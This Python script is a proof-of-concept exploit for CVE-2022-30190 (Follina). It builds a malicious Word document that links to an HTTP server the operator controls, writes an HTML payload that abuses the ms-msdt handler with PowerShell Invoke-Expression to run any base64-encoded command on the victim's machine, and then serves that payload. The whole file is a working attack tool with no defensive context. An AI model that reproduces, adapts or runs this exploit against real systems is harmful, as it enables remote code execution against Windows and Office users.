import tempfile
import shutil
import os
import base64
import http.server
import socketserver
import argparse

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="POC for CVE-2022-30190, aka follina")

    parser.add_argument(
        "--command",
        "-c",
        default="calc.exe",
        help="The command to run on the victim (defaults to calc.exe)"
    )

    parser.add_argument(
        "--ip",
        "-i",
        default="127.0.0.1",
        help="IP to serve the payload on (defaults to 127.0.0.1)",
    )

    parser.add_argument(
        "--port",
        "-p",
        type=int,
        default="4444",
        help="Port to serve the payload on (defaults to 4444)",
    )

    parser.add_argument(
        "--output",
        "-o",
        default="maldoc.docx",
        help="Filename for output, should end with extension .doc, .docx or maybe .rtf (defaults to maldoc.docx)",
    )

    args = parser.parse_args()

    print("[*] Creating maldoc...")
    command = args.command
    host = args.ip
    port = args.port
    filename = args.output

    if not filename.split(".")[-1] in ["doc", "docx", "rtf"]:
        print("[!] Filename should end with extension .doc, .docx or maybe .rtf...")
        exit(1)

    path = tempfile.mkdtemp()
    shutil.copytree("docx", path, dirs_exist_ok=True)

    with open(f"{path}/word/_rels/document.xml.rels", "rt") as f:
        content = f.read()

    content = content.replace("{target}", f"http://{host}:{port}/payload.html")

    with open(f"{path}/word/_rels/document.xml.rels", "wt") as f:
        f.write(content)

    shutil.make_archive(f"{filename}", "zip", path)

    if os.path.exists(f"{filename}"):
        os.remove(f"{filename}")

    os.rename(f"{filename}.zip", f"{filename}")

    print(f"[*] Maldoc now available at ./{filename}")

    print("[*] Generating payload...")
    if not os.path.exists("www"):
        os.makedirs("www")

    command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
    payload = f"""<script>
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{command}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; 
// {"A" * 4096}
</script>
"""
    with open("www/payload.html", "w") as f:
        f.write(payload)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory="www", **kwargs)

    with socketserver.TCPServer((host, port), Handler) as httpd:
        print(f"[*] Now serving on http://{host}:{port} !")
        httpd.serve_forever()
